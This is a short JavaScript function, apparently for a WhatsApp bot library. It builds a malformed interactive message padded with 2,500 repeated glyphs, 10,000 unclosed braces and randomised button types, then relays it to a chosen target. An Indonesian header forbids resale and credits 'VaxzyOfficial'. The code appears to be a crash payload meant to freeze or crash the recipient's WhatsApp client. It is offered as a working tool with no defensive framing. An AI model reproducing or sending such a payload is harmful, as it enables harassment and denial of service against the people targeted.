//jangan di perjual belikan ini khusus pribadi!! ketahuan share free? terima konsekuensinya. Copyright by VaxzyOfficial

async function VxzyXFC(target) {
  try {
   let message = {
     viewOnceMessage: {
       message: {
         messageContextInfo: {
           deviceListMetadata: {},
             deviceListMetadataVersion: 3,
               },
                interactiveMessage: {
                 contextInfo: {
                  mentionedJid: [target],
                   isForwarded: true,
                   forwardingScore: 99999999,
                   businessMessageForwardInfo: {
                   businessOwnerJid: target,
                        },
                    },
                    body: { 
              text: `VaxzyIsHere🤙😜${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await Vxz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (error) {
    console.error("Message relay failed:", error);
  }
}